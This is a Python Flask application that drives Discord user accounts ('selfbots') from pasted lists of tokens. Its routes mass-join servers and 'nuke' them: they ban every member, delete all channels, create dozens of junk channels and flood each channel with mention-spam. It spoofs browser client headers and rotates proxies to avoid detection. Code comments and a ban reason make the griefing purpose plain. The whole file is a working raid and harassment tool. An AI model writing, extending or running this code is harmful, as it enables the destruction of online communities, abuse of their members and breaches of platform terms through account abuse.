import traceback, threading, requests, datetime, asyncio, discord, random, string, base64, json
import Proxy
from flask import Flask, request, redirect, render_template

proxy = Proxy.Proxy("proxy.txt")
app = Flask(__name__)

logs = {}
logIdBotClass = {}
stops = []
failedChannels = []
DISCORD_API_BASE_URL= "https://discord.com/api/v9"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"

class DiscordApis():
    def __init__(self, logId:str, token:str):
        self.logId = logId
        self.token = token
    def generateXSuperProperties(self):
        xSuperPropertiesStr = '{"os":"Windows","browser":"Chrome","device":"","system_locale":"ja"\,"browser_user_agent":"'+USER_AGENT+'","browser_version":"127.0.0.0","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":320705,"client_event_source":null}'
        return base64.b64encode(xSuperPropertiesStr.encode()).decode()
    def generateHeaders(self):
        headers = {
            "user-agent": USER_AGENT,
            "Authorization": self.token,
            "x-super-properties": self.generateXSuperProperties()
        }
        return headers
    def getUserInfo(self):
        res = requests.get(f"{DISCORD_API_BASE_URL}/users/@me", headers=self.generateHeaders())
        return str(res.status_code)[0] == "2", json.loads(res.text)
    def joinGuild(self, inviteCode:str):
        res = requests.post(f"{DISCORD_API_BASE_URL}/invites/{inviteCode}", headers=self.generateHeaders())
        if str(res.status_code)[0] == "2":
            logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+"\n"
        else:
            logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+f" StatusCode: {res.status_code}\n"
        return str(res.status_code)[0] == "2"

class DiscordBot(discord.Client):
    def __init__(self, logId:str, token:str, id:int, name:str, latency:int, messages:list[str], option:list, mode:int):
        super().__init__()
        self.logId = logId
        self.token = token
        
        # DmNukeもServerNukeも呼び出されるから、idとかnameっていう抽象的な名前にしている
        self.guildId = self.userId = id
        self.channelName = self.groupName = name
        
        self.nukeLatency = latency
        self.messages = messages
        if mode == 0:
            self.allUserBan, self.allChannelDelete, self.randomMention, self.exclusionChannelIds, self.channelId = option
        self.mode = mode
    async def banUser(self, user:discord.Member):
        try:
            await user.ban(reason="Fuck Server User")
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" - {str(datetime.datetime.now())} BanUser ID:{user.id} Name:{user.name}\n"
    async def deleteChannel(self, channel:discord.abc.GuildChannel):
        try:
            await channel.delete()
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" - {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
    async def sendMessage(self, message:str, channel:discord.abc.GuildChannel, latencyMs:float):
        if channel in self.guild.categories:
            try:
                self.exclusionChannelIds += str(channel.id)
            except:
                pass
            return
        try:
            await channel.send(message)
            logs[self.logId] += "[+]Success"
        except Exception as e:
            logs[self.logId] += f"[-]Failed {e}"
            try:
                failedChannels.append(channel)
            except:
                pass
        logs[self.logId] += f" - {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
        await asyncio.sleep(latencyMs)
    async def banAllUser(self, guild:discord.Guild):
        logs[self.logId] += "---- Start AllUserBan ----\n"
        await asyncio.gather(*(self.banUser(member) for member in guild.members))
        logs[self.logId] += "---- End ----\n\n\n"
    async def deleteAllChannel(self, guild:discord.Guild):
        logs[self.logId] += "---- Start AllChannelDelete ----\n"
        await asyncio.gather(*(self.deleteChannel(channel) for channel in guild.channels))
        logs[self.logId] += "---- End ----\n\n\n"
    async def createChannel(self, channelName:str, guild:discord.Guild):
        channelName = channelName+"-"+"".join(random.choice(string.ascii_lowercase) for _ in range(10))
        await guild.create_text_channel(channelName)
    async def oneNuke(self, messages:list[str], guild:discord.Guild, channel:discord.abc.GuildChannel, randomMention:bool, roles:list[discord.Role], members:list[discord.Member]):
        for message in messages:
            if message == "":
                continue
            bMessage = message
            if message == messages[0]:
                bMessage = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))+"\n"
            bMessage = bMessage.replace("!userId!", str(random.choice(guild.members).id))
            if randomMention:
                try:
                    bRoles = roles
                    if len(roles) >= 5:
                        bRoles = random.sample(roles, 5)
                    for role in bRoles:
                        bMessage += f"<@&{role.id}> "
                except:
                    pass
                bMessage += "\n"
                try:
                    bMembers = members
                    if len(members) >= 12:
                        bMembers = random.sample(members, 12)
                    for member in bMembers:
                        bMessage += f"<@{member.id}> "
                except:
                    pass
                bMessage += "\n"
            if message != self.messages[0]:
                bMessage = message
            await self.sendMessage(bMessage, channel, self.latency*0.001)
    async def nuke(self, numberOfExecutions=25):
        logs[self.logId] += f"---- Start Nuke ID:{self.user.id} ----\n"
        try:
            self.guild = None
            if not self.channelId:
                self.guild = self.get_guild(self.guildId)
                if not self.guild:
                    logs[self.logId] += f"Error: The server you entered has not been joined by a bot - ID:{self.user.id}\n"
                    return
            else:
                channel = self.get_channel(self.channelId)
                if not channel:
                    logs[self.logId] += f"Error: Not Found Channel - ID:{self.user.id}\n"
                    return
                self.guild = channel.guild
            try:
                i = self.guild.get_member(self.user.id)
                await i.edit(nick="឵᠎")
            except:
                pass
            if self.allUserBan:
                await self.banAllUser(self.guild)
            if self.allChannelDelete:
                await self.deleteAllChannel(self.guild)
                await asyncio.gather(*(self.createChannel(self.channelName, self.guild) for _ in range(60)))
            self.channels = list(self.guild.channels)
            thereds = []
            roles = list(self.guild.roles)
            members = self.guild.members
            # exclusion everyone
            roles.remove(self.guild.default_role)
            for _ in range(numberOfExecutions):
                if self.logId in stops:
                    logs.pop(self.logId)
                    return
                logs[self.logId] += f"--- Nuke ID:{self.user.id} ---\n"
                if not self.channelId:
                    random.shuffle(self.channels)
                    for channel in self.channels:
                        if str(channel.id) in self.exclusionChannelIds:
                            continue
                        if type(channel) == discord.ForumChannel and not channel in thereds:
                            try:
                                self.exclusionChannelIds.append(str(channel.id))
                                channel = await channel.create_thread(name="荒らし共栄圏最強")
                                thereds.append(channel)
                            except:
                                pass
                        await self.oneNuke(self.messages, self.guild, channel, self.randomMention, roles, members)
                        random.shuffle(self.channels)
                else:
                    await self.oneNuke(self.messages, self.guild, channel, self.randomMention, roles, members)
        except:
            logs[self.logId] += f"-- Error ID:{self.user.id} --\n"+traceback.format_exc()+"\n"
        logs[self.logId] += f"---- End ID:{self.user.id} ----\n"
    async def on_ready(self):
        logs[self.logId] += f"Start Client - Token:{base64.b64encode(str(self.user.id).encode()).decode()}, ID:{self.user.id}, Name:{self.user.name}\n"
        if self.mode == 0:
            await self.nuke()
        elif self.mode == 1:
            try:
                guild = self.get_guild(self.guildId)
                await guild.leave()
                logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} LeaveGuild Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
            except Exception as e:
                logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} LeaveGuild Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
    async def on_message(self, message):
        if message.author.bot:
            return
    def runBot(self):
        try:
            apis = DiscordApis(self.logId, self.token)
            if not apis.getUserInfo()[0]:
                logs[self.logId] += f"Error: invalid token - {self.token}\n"
                return
            self.run(self.token, reconnect=True)
        except:
            logs[self.logId] += f"Error:\n{traceback.format_exc()}"

@app.route('/getLog', methods=["GET"])
def getLog():
    if request.args.get("id") in logs:
        return render_template('getLog.html', log=logs[request.args.get("id")])
    else:
        return render_template('getLog.html', log="Not found"), 404

@app.route('/stop', methods=["GET"])
def stop():
    logId = request.args.get("id")
    try:
        asyncio.run(logIdBotClass[logId].guild.leave())
    except:
        pass
    stops.append(logId)
    return redirect(request.referrer)

@app.route('/joinGuild', methods=["GET", "POST"])
def joinGuild():
    if request.method == "POST":
        proxy.getProxy()
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman Joiner PPP\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        guildInviteCode = request.form["guildInviteCode"]
        
        for token in tokens:
            apis = DiscordApis(logId, token)
            userInfo = apis.getUserInfo()
            if userInfo[0]:
                logs[logId] += "OK Token: "+base64.b64encode(str(userInfo[1]["id"]).encode()).decode()+"\n"
                t = threading.Thread(target=apis.joinGuild, args=(guildInviteCode,), daemon=True)
                t.start()
            else:
                logs[logId] += f"Error: invalid token - {token}\n"
        return render_template('selfBotJoinGuild.html', logId=logId)
    return render_template('selfBotJoinGuild.html')

@app.route('/leaveGuild', methods=["GET", "POST"])
def leaveGuild():
    if request.method == "POST":
        proxy.getProxy()
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman Leaver PPP\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        guildId = int(request.form["guildId"])
        
        for token in tokens:
            apis = DiscordApis(logId, token)
            userInfo = apis.getUserInfo()
            if userInfo[0]:
                logs[logId] += "OK Token: "+base64.b64encode(str(userInfo[1]["id"]).encode()).decode()+"\n"
                bot = DiscordBot(logId, token, guildId, None, None, None, None, 1)
                logIdBotClass[logId] = bot
                botThread = threading.Thread(target=bot.runBot, daemon=True)
                botThread.start()
            else:
                logs[logId] += f"Error: invalid token - {token}\n"
        return render_template('selfBotLeaveGuild.html', logId=logId)
    return render_template('selfBotLeaveGuild.html')

@app.route('/channelNuke', methods=["GET", "POST"])
def channelNuke():
    if request.method == "POST":
        proxy.getProxy()
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman Nuke PPP\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        channelId = int(request.form["channelId"])
        latency = int(request.form["latency"])
        message = request.form["message"]
        subMessages  = request.form["subMessages"].split("\r\n")
        randomMention = "randomMention" in request.form
        
        logs[logId] += f"""-- Value you entered --
Tokens:{tokens}
ChannelID:{channelId}
Latency:{latency}ms, {latency*0.001}s
message:\n{message}\n
subMessages:{subMessages}
-- Options --
RandomMention:{randomMention}

"""
        
        for token in tokens:
            bot = DiscordBot(logId, token, None, None, latency, ([message]*(len(subMessages)+2))+subMessages, [False, False, randomMention, None, channelId], 0)
            logIdBotClass[logId] = bot
            botThread = threading.Thread(target=bot.runBot, daemon=True)
            botThread.start()
        return render_template('selfBotChannelNuke.html', logId=logId)
    return render_template('selfBotChannelNuke.html')

@app.route('/nuke', methods=["GET", "POST"])
def nuke():
    if request.method == "POST":
        proxy.getProxy()
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman Nuke PPP\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        guildId = int(request.form["guildId"])
        channelName = request.form["channelName"]
        latency = int(request.form["latency"])
        message = request.form["message"]
        subMessages  = request.form["subMessages"].split("\r\n")
        exclusionChannelIds = request.form["exclusionChannelIds"].split(",")
        allUserBan = "allUserBan" in request.form
        allChannelDelete = "allChannelDelete" in request.form
        randomMention = "randomMention" in request.form
        
        logs[logId] += f"""-- Value you entered --
Tokens:{tokens}
ServerID:{guildId}
ChannelName:{channelName}
Latency:{latency}ms, {latency*0.001}s
message:\n{message}\n
subMessages:{subMessages}
exclusionChannelIDs:{exclusionChannelIds}
-- Options --
AllUserBan:{allUserBan}
AllChannelDelete:{allChannelDelete}
RandomMention:{randomMention}

"""
        
        for token in tokens:
            bot = DiscordBot(logId, token, guildId, channelName, latency, ([message]*(len(subMessages)+2))+subMessages, [allUserBan, allChannelDelete, randomMention, exclusionChannelIds, None], 0)
            logIdBotClass[logId] = bot
            botThread = threading.Thread(target=bot.runBot, daemon=True)
            botThread.start()
        return render_template('selfBotNuke.html', logId=logId)
    return render_template('selfBotNuke.html')

def main():
    port = 8081
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    main()